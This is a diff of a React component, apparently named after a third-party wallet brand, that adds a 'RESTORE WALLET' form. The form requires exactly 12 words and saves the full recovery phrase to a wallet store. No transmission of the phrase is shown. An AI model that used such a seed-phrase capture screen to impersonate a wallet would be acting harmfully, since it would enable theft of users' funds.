@@ -1,9 +1,33 @@
+"use client";
+
 import { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
+import { useWalletStore } from "@/store/walletStore";
 
-const Atomic = () => {
+const Atomic = ({ handleFinish }: { handleFinish: () => void }) => {
 	const [backupPhrase, setBackupPhrase] = useState("");
+	const [words, setWords] = useState<string[]>([]);
+
+	const { setSeedPhrase } = useWalletStore();
+
+	const handleComplete = () => {
+		setSeedPhrase(words.join(" "));
+		handleFinish();
+	};
+
+	// handle input change and split by spaces
+	const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+		const phrase = e.target.value;
+		setBackupPhrase(phrase);
+
+		// split by space, remove empty strings, and update array
+		const separatedWords = phrase
+			.trim()
+			.split(/\s+/)
+			.filter((word) => word.length > 0);
+		setWords(separatedWords);
+	};
 
 	return (
 		<div className="min-h-screen bg-[#1F2843] w-full flex items-center justify-center p-4">
@@ -27,7 +51,7 @@ const Atomic = () => {
 							type="text"
 							id="backupPhrase"
 							value={backupPhrase}
-							onChange={(e) => setBackupPhrase(e.target.value)}
+							onChange={handleChange}
 							className="peer bg-transparent border-none outline-none w-full text-white/90 placeholder-transparent h-12 p-0"
 							placeholder="Your 12-word backup phrase"
 						/>
@@ -45,11 +69,15 @@ const Atomic = () => {
 					{/* Buttons */}
 					<div className="flex flex-col justify-center items-center text-white">
 						<Button
-							disabled={!backupPhrase}
+							onClick={handleComplete}
+							disabled={words.length !== 12}
 							className="w-fit border-2 border-blue-400 disabled:opacity-80 font-bold text-white rounded-full mb-6 px-12 py-6 bg-gradient-to-t from-[#272944] via-[#3D3086] to-[#039DDD] shadow-inner shadow-white/40 [box-shadow:inset_0_3px_6px_rgba(0,0,0,0.6),inset_0_-3px_6px_rgba(255,255,255,0.4)]"
 						>
 							RESTORE WALLET
 						</Button>
+						<p className="text-xs text-white/50">
+							Enter all 12 words to continue
+						</p>
 					</div>
 				</div>
 			</div>
